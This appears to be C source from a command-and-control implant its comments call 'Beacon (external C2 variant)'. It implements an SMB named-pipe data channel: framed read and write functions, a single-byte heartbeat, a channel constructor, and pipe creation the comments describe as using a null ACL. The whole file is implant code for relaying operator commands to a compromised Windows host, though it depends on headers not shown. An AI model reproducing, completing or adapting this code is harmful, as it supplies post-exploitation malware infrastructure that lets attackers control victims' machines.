/*
 * Manage the SMB data channel for Beacon (external C2 variant)
 * Entry point:
 *	1. command_link_wait
 *		user requested SMB data channel
 *	2. smb_init
 *		create our named pipe with a null ACL
 *	3. smb_wait
 *		wait for a connection... send agent id when it comes
 *	4. smb_process
 *		process server data please... do normal beacon stuff.
 * The shared channel body (smb_wait/smb_stop/command_link_wait) lives in
 * client_smb_common.h; this file only carries the extc2-specific pieces:
 * the message-mode read/write channel functions the controller contract
 * requires (4B header and payload written as SEPARATE messages - see
 * docs/MATRIX.md section 6.3).
 */

#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "clientint.h"
#include "jobs.h"

#include "client_smb_common.h"

int link_channel_smb_extc2_read(void * thisp, char * buffer, int max) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	int        get = 0, rlen = 0;

	/* read our length into a pro-forma frame */
	rlen = read_all(inst->pipe, (char *)&get, 4);
	if (rlen == -1 || rlen != 4)
		return -1;

	/* sanity check our get value */
	if (get > max)
		return -1;

	return read_all(inst->pipe, buffer, get);
}

int link_channel_smb_extc2_write(void * thisp, char * buffer, int length) {
	LCHANNEL * inst = (LCHANNEL *)thisp;

	/* restore old behavior of writing a single byte as our heartbeat, instead of pushing empty frames */
	if (length == 0) {
		int empty = 0;
		return link_channel_smb_extc2_write(thisp, (char *)&empty, 1);
	}

	/* build and write our frame header */
	if (!write_all(inst->pipe, (char *)&length, 4))
		return FALSE;

	/* write the entire package */
	return write_all(inst->pipe, buffer, length);
}

/* create a new kind of channel */
LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
	LCHANNEL channel;
	channel = lchannel_smb(pipe);
	channel.wait  = link_channel_smb_wait;
	channel.read  = link_channel_smb_extc2_read;
	channel.write = link_channel_smb_extc2_write;
	return channel;
}

/*
*  init a named pipe
*/
BOOL smb_init() {
	HANDLE temps = INVALID_HANDLE_VALUE;

	/* setup our named pipe please */
	temps = CreateNamedPipe(setting_ptr(SETTING_PIPENAME), PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, MAX_GET, MAX_GET, 0, NULL);

	/* check for errors and fail now... */
	if (temps == INVALID_HANDLE_VALUE) {
		post_error_d(0x17, GetLastError());
		return FALSE;
	}

	/* set post type to POST_SMB now... since everything seems OK */
	post_type = POST_SMB;

	/* now we can assign the handle */
	pipe = temps;
	return TRUE;
}
